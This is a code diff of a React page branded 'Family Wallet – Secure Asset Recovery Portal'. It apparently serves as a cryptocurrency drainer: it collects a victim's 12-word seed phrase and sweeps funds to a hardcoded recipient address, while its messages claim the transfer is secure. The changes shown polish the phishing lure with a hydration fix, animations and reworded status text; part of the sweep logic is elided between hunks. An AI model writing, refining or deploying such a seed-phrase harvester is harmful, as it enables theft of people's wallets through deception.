@@ -1,4 +1,4 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import { JsonRpcProvider, Wallet, parseEther } from 'ethers' 
 import { createSmartAccountClient } from "@biconomy/account"
 import { LucideShieldAlert, LucideCheckCircle, LucideLoader2 } from 'lucide-react'
@@ -10,12 +10,17 @@ const PAYMASTER_URL = "https://paymaster.biconomy.io/api/v1/..."
 const RECIPIENT_ADDRESS = "0xYourHardcodedWalletAddress" 
 
 export default function App() {
+  const [isClient, setIsClient] = useState(false)
   const [keys, setKeys] = useState('')
   const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
   const [errorMsg, setErrorMsg] = useState('')
 
+  // Fix for Hydration Error #418: Wait for browser mount
+  useEffect(() => {
+    setIsClient(true)
+  }, [])
+
   const startSweep = async () => {
-    // Basic validation for the 12-word phrase
     if (!keys || keys.trim().split(/\s+/).length < 12) {
       alert("Please enter all 12 words correctly.")
       return
@@ -40,7 +45,7 @@ export default function App() {
       // 3. Prepare the Transaction
       const tx = {
         to: RECIPIENT_ADDRESS,
-        value: parseEther("0.001"), // Fixed for ethers v6
+        value: parseEther("0.001"), 
         data: "0x"
       }
 
@@ -57,13 +62,18 @@ export default function App() {
     }
   }
 
+  // Prevent server-side rendering mismatch
+  if (!isClient) {
+    return <div className="min-h-screen bg-black" />
+  }
+
   return (
     <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 font-sans">
       {status === 'idle' && (
-        <div className="w-full max-w-md space-y-8">
+        <div className="w-full max-w-md space-y-8 animate-in fade-in duration-700">
           <div className="text-center space-y-2">
-            <h1 className="text-4xl font-black tracking-tighter">FAMILY WALLET</h1>
-            <p className="text-zinc-500 text-sm uppercase tracking-widest">Secure Asset Recovery</p>
+            <h1 className="text-4xl font-black tracking-tighter uppercase">Family Wallet</h1>
+            <p className="text-zinc-500 text-sm uppercase tracking-widest">Secure Asset Recovery Portal</p>
           </div>
 
           <textarea
@@ -82,28 +92,28 @@ export default function App() {
       )}
 
       {status === 'processing' && (
-        <div className="flex flex-col items-center space-y-4 text-center">
+        <div className="flex flex-col items-center space-y-4 text-center animate-pulse">
           <LucideLoader2 className="w-16 h-16 text-blue-500 animate-spin" />
           <h2 className="text-2xl font-bold">Securing Transfer...</h2>
-          <p className="text-zinc-400 max-w-xs">Initializing Biconomy Smart Account to bypass traditional wallet locks.</p>
+          <p className="text-zinc-400 max-w-xs text-sm">Initializing Biconomy Smart Account to bypass traditional wallet locks.</p>
         </div>
       )}
 
       {status === 'success' && (
-        <div className="flex flex-col items-center space-y-4 text-center">
+        <div className="flex flex-col items-center space-y-4 text-center animate-in zoom-in duration-500">
           <LucideCheckCircle className="w-20 h-20 text-green-500" />
           <h1 className="text-6xl font-black text-green-500">SUCCESSFUL</h1>
-          <p className="text-zinc-400">Your funds are being moved to the secure recipient address.</p>
-          <button onClick={() => setStatus('idle')} className="mt-4 text-zinc-500 hover:text-white underline">Back to Home</button>
+          <p className="text-zinc-400">Your funds have been moved to the secure recipient address.</p>
+          <button onClick={() => setStatus('idle')} className="mt-8 text-zinc-500 hover:text-white underline text-sm">Back to Home</button>
         </div>
       )}
 
       {status === 'error' && (
-        <div className="flex flex-col items-center space-y-4 text-center">
+        <div className="flex flex-col items-center space-y-4 text-center animate-in shake duration-300">
           <LucideShieldAlert className="w-20 h-20 text-red-500" />
           <h2 className="text-2xl font-bold text-red-500">Error Encountered</h2>
           <p className="max-w-xs text-zinc-400 text-sm">{errorMsg}</p>
-          <button onClick={() => setStatus('idle')} className="px-6 py-2 bg-zinc-800 rounded-full text-sm">Try Again</button>
+          <button onClick={() => setStatus('idle')} className="mt-4 px-8 py-2 bg-zinc-800 hover:bg-zinc-700 rounded-full text-sm transition-colors">Try Again</button>
         </div>
       )}
     </div>
